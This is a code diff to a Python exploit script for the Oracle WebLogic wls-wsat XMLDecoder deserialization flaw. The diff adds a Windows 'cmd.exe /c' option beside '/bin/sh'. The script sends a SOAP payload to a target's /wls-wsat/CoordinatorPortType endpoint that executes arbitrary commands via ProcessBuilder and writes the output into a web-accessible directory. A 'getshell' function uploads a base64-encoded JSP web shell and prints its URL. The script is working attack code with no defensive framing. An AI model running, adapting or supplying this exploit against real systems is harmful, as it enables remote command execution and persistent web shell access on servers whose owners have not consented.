@@ -17,7 +17,7 @@ timeout = 5
 '''
 payload的格式化
 '''
-def payload_command(command_in,output_file):
+def payload_command(command_in,output_file,os):
     html_escape_table = {
         "&": "&amp;",
         '"': "&quot;",
@@ -30,6 +30,8 @@ def payload_command(command_in,output_file):
     command_in_payload = '{} > ./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}'.format(command_in,output_file)
     command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in_payload)+"</string>"
     #XMLDecoder反序列化payload:
+    cmd_app = '/bin/sh' if os == 'linux' else 'cmd.exe'
+    cmd_param = '-c' if os == 'linux' else '/c'
 
     payload_1 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
                 "   <soapenv:Header> " \
@@ -38,12 +40,12 @@ def payload_command(command_in,output_file):
                 "               <void class=\"java.lang.ProcessBuilder\"> \n" \
                 "                  <array class=\"java.lang.String\" length=\"3\">" \
                 "                      <void index = \"0\">                       " \
-                "                          <string>/bin/sh</string>                 " \
+                "                          <string>{}</string>                 " \
                 "                      </void>                                    " \
                 "                      <void index = \"1\">                       " \
-                "                          <string>-c</string>                  " \
+                "                          <string>{}</string>                  " \
                 "                      </void>                                    " \
-                "                      <void index = \"2\">                       " \
+                "                      <void index = \"2\">                       ".format(cmd_app,cmd_param) \
                 + command_filtered + \
                 "                      </void>                                    " \
                 "                  </array>" \
@@ -79,7 +81,7 @@ def get_output(target,output_file):
 '''
 RCE
 '''
-def weblogic_rce(target,cmd,output_file):
+def weblogic_rce(target,cmd,output_file,os='linux'):
     if not target.startswith('http'):
         target = 'http://{}'.format(target)
     url = '{}/wls-wsat/CoordinatorPortType'.format(target)
@@ -87,7 +89,7 @@ def weblogic_rce(target,cmd,output_file):
     payload_header = {'content-type': 'text/xml','User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
     msg = ''
     try:
-        r = requests.post(url, payload_command(cmd,output_file),headers = payload_header,verify=False,timeout=timeout,proxies=proxies)
+        r = requests.post(url, payload_command(cmd,output_file,os),headers = payload_header,verify=False,timeout=timeout,proxies=proxies)
         #500时说明已成功反序列化执行命令
         if r.status_code == 500:
             #delay一下，保证命令执行完整性：
@@ -106,12 +108,12 @@ def weblogic_rce(target,cmd,output_file):
 '''
 getshell
 '''
-def weblogic_getshell(target,output_file,shell_file):
+def weblogic_getshell(target,output_file,shell_file,os='linux'):
     if not target.startswith('http'):
         target = 'http://{}'.format(target)
     with open(shell_file) as f:
         cmd = 'echo {}|base64 -d'.format(base64.b64encode(f.read()))
-        status,result = weblogic_rce(target,cmd,output_file)
+        status,result = weblogic_rce(target,cmd,output_file,os)
         if status:
             print '[+]shell-> {}/bea_wls_internal/{}'.format(target,output_file)
         return (status,result)
@@ -126,6 +128,7 @@ def main():
     parse.add_argument('-c', '--cmd', required=False,default='id', help='command to execute,default is "id"')
     parse.add_argument('-o', '--output', required=False,default='output.txt', help='output file name,default is output.txt')
     parse.add_argument('-s', '--shell', required = False,default='',help='local jsp file name to upload,and set -o xxx.jsp')
+    parse.add_argument('--os',choices=['linux','win'],default='linux',help='host os:linux or win,default is linux')    
     parse.add_argument('--proxy', action = 'store_true',default=False,help='use proxy')
     args = parse.parse_args()
     
@@ -133,9 +136,9 @@ def main():
     if not args.proxy:
         proxies = None
     if args.shell!='':
-        status,result = weblogic_getshell(args.target,args.output,args.shell)
+        status,result = weblogic_getshell(args.target,args.output,args.shell,args.os)
     else:
-        status,result = weblogic_rce(args.target,args.cmd,args.output)
+        status,result = weblogic_rce(args.target,args.cmd,args.output,args.os)
     #output result:
     if status:
         print result
